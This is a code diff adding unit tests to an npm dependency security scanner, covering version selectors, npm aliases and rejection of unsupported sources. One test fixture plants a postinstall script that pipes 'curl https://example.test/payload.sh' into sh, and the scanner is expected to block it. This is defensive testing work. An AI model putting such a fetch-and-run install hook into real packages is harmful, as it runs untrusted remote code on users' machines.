@@ -76,9 +76,84 @@ describe('DSH compatibility facade using the actual shared scanner', () => {
       'a@1.0.0', 'a@2.0.0', 'b@1.0.0',
     ])
     expect(readLockfileDependencies(dir, false)).toHaveLength(3)
-    expect(readDependencies(dir, false)).toEqual([{ name: 'a' }])
+    expect(readDependencies(dir, false)).toEqual([{ name: 'a', version: '^1.0.0' }])
     expect(LEVEL_RANK.unknown).toBeLessThan(LEVEL_RANK.dangerous)
   })
+
+  it.each(['1.0.0', '^1.0.0', 'legacy'])(
+    'CI resolves manifest selector %s without substituting latest or requiring a literal match',
+    async (selector) => {
+      await writeFile(join(dir, 'package.json'), JSON.stringify({
+        name: 'fixture', dependencies: { a: selector },
+      }))
+      const packument = metadata()
+      vi.stubGlobal('fetch', vi.fn(async () => new Response(JSON.stringify({
+        ...packument, 'dist-tags': { latest: '2.0.0', legacy: '1.0.0' },
+      }))))
+
+      const report = await engine.ciScan({ dir })
+
+      expect(readDependencies(dir, false)).toEqual([{ name: 'a', version: selector }])
+      expect(report.failed).toBe(false)
+      expect(report.summary.errors).toBe(0)
+      expect(report.packages).toEqual([expect.objectContaining({
+        name: 'a', version: '1.0.0', exists: true,
+      })])
+    },
+  )
+
+  it('CI scans an npm alias using its real scoped package name and requested range', async () => {
+    await writeFile(join(dir, 'package.json'), JSON.stringify({
+      name: 'fixture', dependencies: { alias: 'npm:@scope/a@^1.0.0' },
+    }))
+    const fetch = vi.fn(async (_url: string) => new Response(JSON.stringify(metadata('@scope/a'))))
+    vi.stubGlobal('fetch', fetch)
+
+    const report = await engine.ciScan({ dir })
+
+    expect(readDependencies(dir, false)).toEqual([{ name: '@scope/a', version: '^1.0.0' }])
+    expect(report.failed).toBe(false)
+    expect(report.packages[0]).toMatchObject({ name: '@scope/a', version: '1.0.0' })
+    expect(decodeURIComponent(new URL(String(fetch.mock.calls[0]?.[0])).pathname)).toBe('/@scope/a')
+  })
+
+  it('CI blocks critical evidence in an older requested release even when latest is benign', async () => {
+    await writeFile(join(dir, 'package.json'), JSON.stringify({
+      name: 'fixture', dependencies: { a: '1.0.0' },
+    }))
+    const packument = metadata()
+    vi.stubGlobal('fetch', vi.fn(async () => new Response(JSON.stringify({
+      ...packument,
+      versions: {
+        ...packument.versions,
+        '1.0.0': {
+          ...packument.versions['1.0.0'],
+          scripts: { postinstall: 'curl https://example.test/payload.sh | sh' },
+        },
+      },
+    }))))
+
+    const report = await engine.ciScan({ dir })
+
+    expect(report.failed).toBe(true)
+    expect(report.summary.errors).toBe(0)
+    expect(report.packages[0]).toMatchObject({ name: 'a', version: '1.0.0', exists: true })
+    expect(report.packages[0].findingCount).toBeGreaterThan(0)
+  })
+
+  it.each(['file:../local', 'github:owner/repo', 'https://example.test/a.tgz'])(
+    'CI refuses unsupported manifest source %s before registry access',
+    async (selector) => {
+      await writeFile(join(dir, 'package.json'), JSON.stringify({
+        name: 'fixture', dependencies: { a: selector },
+      }))
+      const fetch = vi.fn()
+      vi.stubGlobal('fetch', fetch)
+
+      await expect(engine.ciScan({ dir })).rejects.toThrow(/unsupported source/)
+      expect(fetch).not.toHaveBeenCalled()
+    },
+  )
 
   it('uses the shared risk policy for critical findings regardless of a zero score', async () => {
     vi.spyOn(engine, 'checkPackage').mockResolvedValue({
